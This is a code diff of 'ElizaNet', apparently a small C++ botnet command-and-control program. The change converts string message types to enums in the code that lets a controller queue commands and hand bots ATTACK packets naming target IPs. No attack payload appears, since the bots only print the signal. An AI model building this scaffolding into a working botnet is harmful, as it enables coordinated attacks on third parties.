@@ -37,19 +37,19 @@ void ElizaNet::handleClients(int sock) {
 
     std::cout << "\t" << "[" << paketcount << "]" << " paket from client {" << std::endl
         << "\t\tIP: " << std::string(clientIp) << std::endl
-        << "\t\tSendertype: " << fromSender->getSenderType() << std::endl 
-        << "\t\tMessagetype: " << fromSender->getMessageType() << std::endl
+        << "\t\tSendertype: " << fromSender->senderTypeToString() << std::endl 
+        << "\t\tMessagetype: " << fromSender->messageTypeToString() << std::endl
         << "\t\tMessage: " << fromSender->getMessage() << std::endl
         << "\t}" << std::endl << std::endl;
 
-    if(fromSender->getSenderType() == "HEAD") {
+    if(fromSender->getSenderType() == SenderType::HEAD) {
         response = this->handleHead(fromSender);
         
     }
-    else if(fromSender->getSenderType() == "BOT") {
+    else if(fromSender->getSenderType() == SenderType::BOT) {
         response = this->handleBot(fromSender, std::string(clientIp));
     }
-    write(sock, (char *)response->toString().c_str(), strlen((char *)response->toString().c_str()));
+    write(sock, (char *)response->toNetworkPaket().c_str(), strlen((char *)response->toNetworkPaket().c_str()));
     close(sock);
 }
 
@@ -68,13 +68,14 @@ void ElizaNet::startBot() {
         char buf[1024];
 
         toserver->createPaket(SenderType::BOT, MessageType::STATUS, "WHATSGOINGON?");
-        send(sockClient,  toserver->toString().c_str(), strlen(toserver->toString().c_str()), 0);
+        //std::cout << toserver->toNetworkPaket();
+        send(sockClient,  toserver->toNetworkPaket().c_str(), strlen(toserver->toNetworkPaket().c_str()), 0);
         read(sockClient, buf, 1024);
         fromserver->parsePaket(std::string(buf));
-        if(fromserver->getMessageType() == "ATTACK") {
+        if(fromserver->getMessageType() == MessageType::ATTACK) {
             std::cout << "Attack Signal recieved!!!!" << std::endl << "Target is " << fromserver->getMessage() << std::endl;
         }
-        else if(fromserver->getMessageType() == "COMMAND") {
+        else if(fromserver->getMessageType() == MessageType::COMMAND) {
             std::cout << "Command recieved! " << fromserver->getMessage() << std::endl;
         }
         else {
@@ -121,13 +122,13 @@ void ElizaNet::startHead() {
         if(connect(sockClient, (struct sockaddr*)&server, sizeof(server)) == 0) {
             std::cout << "connection successfull, sending now..." << std::endl;
         }
-        send(sockClient,  toserver->toString().c_str(), strlen(toserver->toString().c_str()), 0);
+        send(sockClient,  toserver->toNetworkPaket().c_str(), strlen(toserver->toNetworkPaket().c_str()), 0);
         read(sockClient, buf, 1024);
         std::cout << "answer recieved..." << std::endl << "===========" << std::endl;
         fromserver->parsePaket(std::string(buf));
 
-        if(fromserver->getSenderType() == "SERVER") {
-            if(fromserver->getMessageType() == "GENERIC") {
+        if(fromserver->getSenderType() == SenderType::SERVER) {
+            if(fromserver->getMessageType() == MessageType::GENERIC) {
                 if(fromserver->getMessage() == "CMDRECIEVED") {
                     std::cout << "Command recieved and waiting for client callback..." << std::endl << std::endl;
                 }
@@ -156,14 +157,14 @@ std::vector<std::string> ElizaNet::split(std::string s, std::string delimiter) {
 
 ElizaPaket* ElizaNet::handleHead(ElizaPaket* fromServer) {
     ElizaPaket* response = new ElizaPaket();
-    if(fromServer->getMessageType() == "COMMAND") {
+    if(fromServer->getMessageType() == MessageType::COMMAND) {
         std::vector<std::string> cmd = this->split(fromServer->getMessage(), ":");
         this->targetIp = cmd[0];
         this->targetCommand = cmd[1];
         this->commandMap[targetIp] = targetCommand;
         response->createPaket(SenderType::SERVER, MessageType::GENERIC, "CMDRECIEVED"); 
     }
-    else if(fromServer->getMessageType() == "GENERIC") {
+    else if(fromServer->getMessageType() == MessageType::GENERIC) {
         if(fromServer->getMessage() == "TEST") {
             response->createPaket(SenderType::SERVER, MessageType::GENERIC, "ALLOK");
         }
@@ -172,7 +173,7 @@ ElizaPaket* ElizaNet::handleHead(ElizaPaket* fromServer) {
 }
 ElizaPaket* ElizaNet::handleBot(ElizaPaket* fromServer, std::string clientIp) {
     ElizaPaket* response = new ElizaPaket();
-    if(fromServer->getMessageType() == "STATUS") {
+    if(fromServer->getMessageType() == MessageType::STATUS) {
         if(this->targetDefined == true) {
             response->createPaket(SenderType::SERVER, MessageType::ATTACK, targetIp);        
         }
